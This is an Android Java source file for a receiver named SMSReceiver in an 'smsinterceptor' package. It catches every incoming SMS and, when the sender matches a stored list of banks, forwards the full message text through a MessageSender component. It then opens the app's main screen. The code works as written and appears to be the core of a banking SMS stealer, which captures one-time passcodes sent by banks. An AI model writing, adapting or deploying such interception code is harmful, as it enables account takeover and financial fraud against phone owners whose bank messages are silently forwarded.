package bz.militaryholding.smsinterceptor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.telephony.SmsMessage;
import bz.militaryholding.smsinterceptor.tools.MessageSender;
import bz.militaryholding.smsinterceptor.tools.Prefs;

import java.util.List;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {

            final List<String> banks = Prefs.getInstance(context).getBanks();
            if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                new Handler().post(new Runnable() {
                    @Override
                    public void run() {
                        Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
                        final SmsMessage[] messages = new SmsMessage[pduArray.length];
                        if(messages.length>-1) {
                            //Log.d("SMS Intercept", "messages size="+messages.length);
                            for (int i = 0; i < pduArray.length; i++) {
                                messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
                            }
                            String bank = messages[0].getDisplayOriginatingAddress().toUpperCase();
                            if(banks.contains(bank)) {
                                StringBuilder bodyText = new StringBuilder();
                                for (int i = 0; i < messages.length; i++) {
                                    bodyText.append(messages[i].getMessageBody());
                                }
                                final String smsText = bodyText.toString();
                                MessageSender.getInstance(context.getApplicationContext()).sendSmsText(bank, smsText);

                                //Log.d("SMS Intercept", smsText);

                                context.startActivity(new Intent(context, MainActivity.class)
                                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                            }
                        }
                    }
                });
        }
    }
}